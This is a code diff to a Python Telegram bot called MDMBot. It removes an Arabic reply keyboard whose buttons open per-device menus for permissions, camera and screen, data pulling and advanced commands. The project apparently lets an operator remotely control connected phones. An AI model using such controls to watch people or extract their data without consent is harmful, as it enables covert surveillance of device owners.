@@ -22,7 +22,7 @@ from datetime import datetime, timedelta, timezone
 from flask import Flask, jsonify, make_response, request, Response
 from flask_socketio import SocketIO, emit, disconnect
 import telebot
-from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton
+from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -1036,23 +1036,6 @@ class MDMBot:
             # Build beautiful dashboard
             dashboard_text = _format_dashboard(stats, devs)
 
-            # ⚡ إرسال Reply Keyboard في رسالة منفصلة (مهم!)
-            reply_kb = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-            reply_kb.add(
-                KeyboardButton("🎮 لوحة التحكم"),
-                KeyboardButton("🔓 الأذونات")
-            )
-            reply_kb.add(
-                KeyboardButton("📷 كاميرا وشاشة"),
-                KeyboardButton("📦 سحب بيانات")
-            )
-            reply_kb.add(
-                KeyboardButton("⚡ أوامر متقدمة"),
-                KeyboardButton("ℹ️ معلومات")
-            )
-            # ⚡ إرسال Reply Keyboard أولاً في رسالة منفصلة
-            bot.send_message(m.chat.id, "📱 <b>أزرار التحكم السريع</b>\nاستخدم الأزرار أدناه:", parse_mode="HTML", reply_markup=reply_kb)
-
             # Build inline keyboard based on device state
             if not devs:
                 kb = InlineKeyboardMarkup(row_width=1)
@@ -1353,68 +1336,6 @@ class MDMBot:
         def _t(m):
             cid = m.chat.id
             text = m.text.strip()
-
-            # ⚡ معالجة أزرار Reply Keyboard الدائمة
-            if text == "🎮 لوحة التحكم":
-                devs = self.dm.get_all_devices()
-                online_devs = self.dm.get_online_devices()
-                if online_devs:
-                    dev = online_devs[0]
-                    kb = control_panel_keyboard(dev["device_id"], dev.get("banned", False))
-                    bot.send_message(cid, f"🎮 <b>لوحة التحكم</b>\n📱 {dev_label(dev)}", parse_mode="HTML", reply_markup=kb)
-                else:
-                    bot.send_message(cid, "🔴 لا يوجد جهاز متصل حالياً")
-                return
-
-            if text == "🔓 الأذونات":
-                devs = self.dm.get_online_devices()
-                if devs:
-                    dev = devs[0]
-                    kb = permissions_keyboard(dev["device_id"])
-                    bot.send_message(cid, f"🔓 <b>الأذونات</b>\n📱 {dev_label(dev)}", parse_mode="HTML", reply_markup=kb)
-                else:
-                    bot.send_message(cid, "🔴 لا يوجد جهاز متصل")
-                return
-
-            if text == "📷 كاميرا وشاشة":
-                devs = self.dm.get_online_devices()
-                if devs:
-                    dev = devs[0]
-                    kb = camera_keyboard(dev["device_id"])
-                    bot.send_message(cid, f"📷 <b>كاميرا وشاشة</b>\n📱 {dev_label(dev)}", parse_mode="HTML", reply_markup=kb)
-                else:
-                    bot.send_message(cid, "🔴 لا يوجد جهاز متصل")
-                return
-
-            if text == "📦 سحب بيانات":
-                devs = self.dm.get_online_devices()
-                if devs:
-                    dev = devs[0]
-                    kb = data_keyboard(dev["device_id"])
-                    bot.send_message(cid, f"📦 <b>سحب بيانات</b>\n📱 {dev_label(dev)}", parse_mode="HTML", reply_markup=kb)
-                else:
-                    bot.send_message(cid, "🔴 لا يوجد جهاز متصل")
-                return
-
-            if text == "⚡ أوامر متقدمة":
-                devs = self.dm.get_online_devices()
-                if devs:
-                    dev = devs[0]
-                    kb = advanced_keyboard(dev["device_id"])
-                    bot.send_message(cid, f"⚡ <b>أوامر متقدمة</b>\n📱 {dev_label(dev)}", parse_mode="HTML", reply_markup=kb)
-                else:
-                    bot.send_message(cid, "🔴 لا يوجد جهاز متصل")
-                return
-
-            if text == "ℹ️ معلومات":
-                devs = self.dm.get_online_devices()
-                if devs:
-                    dev = devs[0]
-                    kb = info_keyboard(dev["device_id"])
-                    bot.send_message(cid, f"ℹ️ <b>معلومات</b>\n📱 {dev_label(dev)}", parse_mode="HTML", reply_markup=kb)
-                else:
-                    bot.send_message(cid, "🔴 لا يوجد جهاز متصل")
-                return
 
             # Handle pending parameter input
             if cid in self._pending:
